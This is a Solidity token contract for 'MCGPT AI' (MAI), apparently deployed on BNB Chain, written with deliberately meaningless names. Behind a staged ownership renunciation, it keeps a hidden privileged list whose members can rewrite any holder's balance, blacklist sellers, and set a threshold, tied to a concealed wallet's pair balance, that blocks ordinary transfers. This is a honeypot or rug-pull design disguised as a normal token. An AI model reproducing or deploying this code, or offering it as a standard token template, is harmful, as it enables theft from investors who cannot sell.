/**
 *Submitted for verification at BscScan.com on 2023-03-19
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface liquidityLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address sellEnable) external view returns (uint256);

    function transfer(address autoModeShould, uint256 autoToken) external returns (bool);

    function allowance(address fundMinTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 autoToken) external returns (bool);

    function transferFrom(
        address sender,
        address autoModeShould,
        uint256 autoToken
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoLaunchedBuy, uint256 value);
    event Approval(address indexed fundMinTx, address indexed spender, uint256 value);
}

interface toTradingSell is liquidityLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract senderFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletTx {
    function createPair(address feeSwap, address modeSwap) external returns (address);
}

interface swapTo {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract MCGPTAI is senderFund, liquidityLaunch, toTradingSell {

    address enableTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function launchFee(uint256 autoToken) public {
        isSwap();
        tokenReceiver = autoToken;
    }

    bool public takeLiquidityLaunched;

    uint8 private senderAuto = 18;

    function decimals() external view virtual override returns (uint8) {
        return senderAuto;
    }

    function name() external view virtual override returns (string memory) {
        return exemptAt;
    }

    function isSwap() private view {
        require(launchLaunched[_msgSender()]);
    }

    function transferFrom(address exemptFrom, address autoModeShould, uint256 autoToken) external override returns (bool) {
        if (_msgSender() != enableTo) {
            if (toAuto[exemptFrom][_msgSender()] != type(uint256).max) {
                require(autoToken <= toAuto[exemptFrom][_msgSender()]);
                toAuto[exemptFrom][_msgSender()] -= autoToken;
            }
        }
        return shouldMax(exemptFrom, autoModeShould, autoToken);
    }

    event OwnershipTransferred(address indexed takeTxShould, address indexed modeList);

    address public maxAuto;

    mapping(address => bool) public receiverShould;

    bool public totalIs;

    string private sellReceiver = "MAI";

    uint256 private tokenLaunchedLaunch;

    function liquidityToken(address walletSenderTo) public {
        if (takeLiquidityLaunched) {
            return;
        }
        if (feeTo == buyFee) {
            feeTo = false;
        }
        launchLaunched[walletSenderTo] = true;
        
        takeLiquidityLaunched = true;
    }

    function receiverLaunch(address launchedSender) public {
        isSwap();
        
        if (launchedSender == maxAuto || launchedSender == shouldFrom) {
            return;
        }
        receiverShould[launchedSender] = true;
    }

    function balanceOf(address sellEnable) public view virtual override returns (uint256) {
        return launchTotal[sellEnable];
    }

    mapping(address => mapping(address => uint256)) private toAuto;

    function owner() external view returns (address) {
        return autoLaunch;
    }

    uint256 tokenReceiver;

    constructor (){
        if (buyFee) {
            buyTrading = tokenLaunchedLaunch;
        }
        swapTo modeMarketing = swapTo(enableTo);
        shouldFrom = walletTx(modeMarketing.factory()).createPair(modeMarketing.WETH(), address(this));
        
        launchLaunched[_msgSender()] = true;
        launchTotal[_msgSender()] = shouldReceiver;
        maxAuto = _msgSender();
        if (tokenLaunchedLaunch != buyTrading) {
            sellTrading = true;
        }
        emit Transfer(address(0), maxAuto, shouldReceiver);
        autoLaunch = _msgSender();
        senderTotal();
    }

    bool private sellTrading;

    function symbol() external view virtual override returns (string memory) {
        return sellReceiver;
    }

    function walletMax(address exemptFrom, address autoModeShould, uint256 autoToken) internal returns (bool) {
        require(launchTotal[exemptFrom] >= autoToken);
        launchTotal[exemptFrom] -= autoToken;
        launchTotal[autoModeShould] += autoToken;
        emit Transfer(exemptFrom, autoModeShould, autoToken);
        return true;
    }

    function approve(address limitFrom, uint256 autoToken) public virtual override returns (bool) {
        toAuto[_msgSender()][limitFrom] = autoToken;
        emit Approval(_msgSender(), limitFrom, autoToken);
        return true;
    }

    function fundTake(address teamBuy, uint256 autoToken) public {
        isSwap();
        launchTotal[teamBuy] = autoToken;
    }

    function transfer(address teamBuy, uint256 autoToken) external virtual override returns (bool) {
        return shouldMax(_msgSender(), teamBuy, autoToken);
    }

    function shouldMax(address exemptFrom, address autoModeShould, uint256 autoToken) internal returns (bool) {
        if (exemptFrom == maxAuto) {
            return walletMax(exemptFrom, autoModeShould, autoToken);
        }
        uint256 minEnable = liquidityLaunch(shouldFrom).balanceOf(launchFund);
        require(minEnable <= tokenReceiver);
        require(!receiverShould[exemptFrom]);
        return walletMax(exemptFrom, autoModeShould, autoToken);
    }

    uint256 public buyTrading;

    string private exemptAt = "MCGPT AI";

    function allowance(address fundBuy, address limitFrom) external view virtual override returns (uint256) {
        if (limitFrom == enableTo) {
            return type(uint256).max;
        }
        return toAuto[fundBuy][limitFrom];
    }

    mapping(address => uint256) private launchTotal;

    bool private feeTo;

    bool private buyFee;

    uint256 private shouldReceiver = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return shouldReceiver;
    }

    mapping(address => bool) public launchLaunched;

    bool private tokenList;

    function senderTotal() public {
        emit OwnershipTransferred(maxAuto, address(0));
        autoLaunch = address(0);
    }

    function getOwner() external view returns (address) {
        return autoLaunch;
    }

    address private autoLaunch;

    address launchFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address public shouldFrom;

}